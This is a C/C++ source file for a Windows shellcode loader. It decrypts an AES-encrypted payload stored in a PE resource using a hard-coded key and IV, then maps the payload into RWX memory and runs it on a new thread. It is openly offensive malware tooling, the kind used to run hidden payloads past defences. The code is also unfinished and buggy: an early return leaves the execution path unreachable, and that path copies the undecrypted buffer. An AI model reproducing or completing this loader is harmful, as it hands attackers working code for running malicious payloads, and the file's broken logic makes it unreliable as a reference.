#include <windows.h>
#include <stdio.h>
#include <bcrypt.h>
#include "..\utils\utility.h"
#include "..\utils\resources.h"

UCHAR key[] = "#shellcodefacile#shellcodefacile";
UCHAR initializevector[] = "\x4d\x96\x9d\x00\x0b\x32\x03\x50\x1c\xdc\x01\xfa\x90\xed\xfc\x9b";


int getResourceAddr(LPVOID *resAddr, SIZE_T *resSize){

    HRSRC   res;
    HGLOBAL resLoaded;

    res = FindResource(NULL, MAKEINTRESOURCE(RSC_AES), RT_RCDATA);
    if (res == NULL){
        MESSAGE(FAIL, "Impossible to find resource\n");
        PRINT_ERROR(FindResource);
        return EXIT_FAILURE;
    }
    resLoaded = LoadResource(NULL, res);
    if (resLoaded == NULL){
        MESSAGE(FAIL, "Impossible to load resource\n");
        PRINT_ERROR(LoadResource);
        return EXIT_FAILURE;
    } 
    *resAddr = LockResource(resLoaded);
    if (resAddr == NULL){
        MESSAGE(FAIL, "Impossible to lock resource\n");
        PRINT_ERROR(lockResource);
        return EXIT_FAILURE;
    }
    *resSize = SizeofResource(NULL, res);

    return EXIT_SUCCESS;
}

void listAlgorithms(){
    ULONG                           numAlgorithms = 0;
    BCRYPT_ALGORITHM_IDENTIFIER     *algorithms = NULL;
    NTSTATUS                        status;

    // Enumerate all cipher (encryption) algorithms
    status = BCryptEnumAlgorithms(BCRYPT_CIPHER_OPERATION, &numAlgorithms, &algorithms, 0);

    if (BCRYPT_SUCCESS(status)) {
        wprintf(L"Number of available cipher algorithms: %lu\n", numAlgorithms);
        for (ULONG i = 0; i < numAlgorithms; i++) {
            wprintf(L"Algorithm name (as string): %s\n", algorithms[i].pszName);

            // Print each character of the algorithm name as numeric values
            wprintf(L"Algorithm name (as code points): ");
            wchar_t *name = algorithms[i].pszName;
            for (int j = 0; name[j] != '\0'; j++) {
                wprintf(L"[%c] ", name[j]);  // Print the Unicode code points of each character
            }
            wprintf(L"\n");

            wprintf(L"Flags: 0x%x\n", algorithms[i].dwFlags);
        }
        // Free the algorithm list after use
        BCryptFreeBuffer(algorithms);
    } else {
        printf("BCryptEnumAlgorithms failed with error code: 0x%x\n", status);
    }
}

// g++ -m64  -o aesCurrentProcessRsc.exe aesCurrentProcessRsc.cpp ../utils/resources.o -lbcrypt
int main(int argc, char const *argv[])
{
    DWORD               oldProtection;
    DWORD               status;
    HANDLE              threadHandle;
    LPVOID              resAddr;
    LPVOID              func;
    SIZE_T              resSize;
    BCRYPT_ALG_HANDLE   algorithmHandle;
    BCRYPT_KEY_HANDLE   keyHandle;
    PUCHAR              decrypted;
    SIZE_T              decryptedSize;    
    DWORD               nbBytes;   
    DWORD               blockSize = 16; 

    
    getResourceAddr(&resAddr, &resSize);

    // Decrypt encrypted data from resource file
    // here...
    // Print available algorith provider
    listAlgorithms();
    // Open algorithm provider    
    status = BCryptOpenAlgorithmProvider(&algorithmHandle, (LPCWSTR)BCRYPT_AES_ALGORITHM, MS_PLATFORM_CRYPTO_PROVIDER, 0);
    if (status != 0){
        MESSAGE(FAIL, "Impossible to open CNG algorithm provider. Error code 0x%x\n", status);
        return EXIT_FAILURE;
    }
    // Set block size
    status = BCryptSetProperty(algorithmHandle, BCRYPT_BLOCK_LENGTH, (PUCHAR)&blockSize, sizeof(blockSize), 0);
    if ( status != 0){
        MESSAGE(FAIL, "Impossible to open CNG algorithm provider. Error code 0x%x\n", status);
        return EXIT_FAILURE;
    }
    // set block chaining mode
    status = BCryptSetProperty(algorithmHandle, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if ( status != 0){
        MESSAGE(FAIL, "Impossible to set mode to the CNG algorithm provider. Error code 0x%x\n", status);
        return EXIT_FAILURE;
    }
    // Generate key handle
    status = BCryptGenerateSymmetricKey(algorithmHandle, &keyHandle, NULL, 0, (PUCHAR)&key, sizeof(key), 0);
    // Decrypt padded data
    decryptedSize = sizeof(UCHAR) * resSize;
    decrypted = (PUCHAR)malloc(decryptedSize);
    status = BCryptDecrypt(keyHandle, (PUCHAR)resAddr, resSize, NULL, (PUCHAR)&initializevector, sizeof(initializevector), decrypted, decryptedSize, &nbBytes, 0);
    // print decryipted padded data
    for(int i = 0; i < decryptedSize; i++ ){
        printf("%s", decrypted);
    }

    return EXIT_SUCCESS;

    func = VirtualAlloc(0, resSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    RtlMoveMemory(func, resAddr, resSize);
    if (VirtualProtect(func, resSize, PAGE_EXECUTE_READWRITE, &oldProtection) == 0){
        MESSAGE(FAIL, "Impossible to change the protection of the allocated space in the current process\n");
        PRINT_ERROR(VirtualProtect);
        return EXIT_FAILURE;
    }
    MESSAGE(OKAY, "Permission changed successfully address: 0x%p\n", func);
    MESSAGE(INFO, "Press <enter> to continue...");
    getchar();
    //((void(*)())func)();
    threadHandle = CreateThread(NULL, resSize, (LPTHREAD_START_ROUTINE)func, NULL, 0, NULL);
    if ( threadHandle == NULL){
        MESSAGE(FAIL, "Impossible to create thread\n");
        PRINT_ERROR(CreateThread);
        return EXIT_FAILURE;
    }
    MESSAGE(OKAY, "Thread started\n");
    WaitForSingleObject(threadHandle, INFINITE);

    return EXIT_SUCCESS;
}
